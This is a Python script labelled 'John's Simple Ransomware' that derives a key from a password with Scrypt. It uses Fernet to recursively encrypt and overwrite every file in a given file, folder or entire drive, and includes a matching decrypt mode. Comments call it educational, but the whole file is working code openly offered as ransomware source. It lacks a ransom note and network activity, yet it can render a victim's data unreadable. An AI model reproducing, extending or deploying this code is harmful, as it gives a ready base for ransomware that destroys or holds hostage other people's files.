import pathlib
import secrets      # use to salt the password. generates strong random numbers (better than 'random' module)
import os
import base64
import getpass
import cryptography
import argparse     # used for making a CLI menu
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt

'''
INSTRUCTIONS:



'''



# this is a very simple kind of ransomware, meant to demonstrate the basic concepts, NOT for actual real-world usage (for educational purposes only)

# this uses AES for symmetric key encryption (same key to encrypt and decrypt)


# generate the salt used for key derivation, `size` is the length of the salt to generate
def generate_salt(size=16):
    return secrets.token_bytes(size)


# derives the key from the password and the salt
def derive_key(salt, password):

    # 'length' - length of the key 
    # 'n' - CPU/memory cost, must be larger than 1 and a power of 2
    # 'r' - block size
    # 'p' - parallelization
    # recommended values: "r=8, p=1, n=2**14 or 2**20 for sensitive files"

    # https://cryptography.io/en/latest/hazmat/primitives/key-derivation-functions/#cryptography.hazmat.primitives.kdf.scrypt.Scrypt
    
    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)

    return kdf.derive(password.encode())


# load salt from salt.salt file
def load_salt():
    return open("salt.salt", "rb").read()


# generate a key from password and salt.
def generate_key(password, salt_size=16, load_existing_salt=False, save_salt=True):
    # if `load_existing_salt` is True, it'll load the salt from 'salt.salt' in current directory
    # if `save_salt` is True, then it will generate a new salt and save it to "salt.salt" in current directory
    
    if load_existing_salt:
        salt = load_salt()

    # generate new salt and save it
    elif save_salt:
        salt = generate_salt(salt_size)
        with open("salt.salt", "wb") as salt_file:      # open(filename, write binary)
            salt_file.write(salt)
    
    # generate the key from the salt and the password
    derived_key = derive_key(salt, password)
    
    # encode the key with Base 64 and return it
    return base64.urlsafe_b64encode(derived_key)


# given a filename (str) and key (bytes), encrypt the file's data and overwrite it
def encrypt(filename, key):

    f = Fernet(key)     # make Fernet object with the key
    
    with open(filename, "rb") as file:  # read the data of the file that'll be encrypted. open(filename, read binary)
        file_data = file.read()

    encrypted_data = f.encrypt(file_data)   # encrypt data with 'encrypt' method from Fernet

    with open(filename, "wb") as file:      # take encrypted_data and and overwrite the original file. open(filename, write binary)
        file.write(encrypted_data)


# given a filename (str) and key (bytes), decrypt the file's encrypted data and overwrite it
def decrypt(filename, key):
    f = Fernet(key)

    with open(filename, "rb") as file:  # read encrypted data
        encrypted_data = file.read()

    try:                                # decrypt data with 'decrypt' method from Fernet
        decrypted_data = f.decrypt(encrypted_data)

    except cryptography.fernet.InvalidToken:    # ERROR (password incorrect, or it might be a weird error)
        print("[!] Invalid token. Password is probably incorrect.")
        return

    with open(filename, "wb") as file:      # take decrypted_data and overwrite the encrypted file
        file.write(decrypted_data)


# recursive function. if it's a folder, encrypt the whole folder (all files)
def encrypt_folder(foldername, key):

    # 'glob()' from pathlib's 'Path' class gets all the subfolders and files in a folder. Better than 'os.scandir()' because glob returns Path objects, not strings
    for child in pathlib.Path(foldername).glob("*"):

        if child.is_file():         # if the child of the folder is a file, encrypt the file
            print(f"[*] Encrypting {child}")
            encrypt(child, key)     # encrypt() from earlier

        elif child.is_dir():       # if the child of the folder is another folder, recursively call this function again, but pass the 'child' path where 'foldername' is 
            encrypt_folder(child, key)


# recursive function. if it's a folder, decrypt the whole folder (all files)
def decrypt_folder(foldername, key):
    for child in pathlib.Path(foldername).glob("*"):

        if child.is_file():     # if the child is a file, decrypt it
            print(f"[*] Decrypting {child}")
            decrypt(child, key) # decrypt() from earlier

        elif child.is_dir():     # if the child is another folder, recursively call this function again, but pass 'child' path into 'foldername'
            decrypt_folder(child, key)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="John's Simple Ransomware")
    parser.add_argument("path", help="Path to encrypt or decrypt. Can be a file, folder, or entire drive")
    parser.add_argument("-s", "--salt-size", help="If True, a new salt with the passed size is generated", type=int)
    parser.add_argument("-e", "--encrypt", action="store_true", help="Encrypt the file/folder. (Can't be used with '-d')")
    parser.add_argument("-d", "--decrypt", action="store_true", help="Decrypt the file/folder. (Can't be used with '-e')")

    args = parser.parse_args()

    if args.encrypt:
        password = getpass.getpass("Enter the password to encrypt: ")

    elif args.decrypt:
        password = getpass.getpass("Enter the password to decrypt: ")

    # generate the key
    if args.salt_size:
        key = generate_key(password, salt_size=args.salt_size, save_salt=True)

    else:
        key = generate_key(password, load_existing_salt=True)

    # get encrypt and decrypt flags
    encrypt_ = args.encrypt
    decrypt_ = args.decrypt

    # check if encrypt and decrypt are both specified (not allowed)
    if encrypt_ and decrypt_:
        raise TypeError("Can only encrypt OR decrypt the file.")

    elif encrypt_:  # check if it's a file or folder and encrypt it
        if os.path.isfile(args.path):
            encrypt(args.path, key)

        elif os.path.isdir(args.path):
            encrypt_folder(args.path, key)

    elif decrypt_:  # check if it's a file or folder and decrypt it
        if os.path.isfile(args.path):
            decrypt(args.path, key)

        elif os.path.isdir(args.path):
            decrypt_folder(args.path, key)

    else:
        raise TypeError("Check your arguments. You can only encrypt OR decrypt the file.")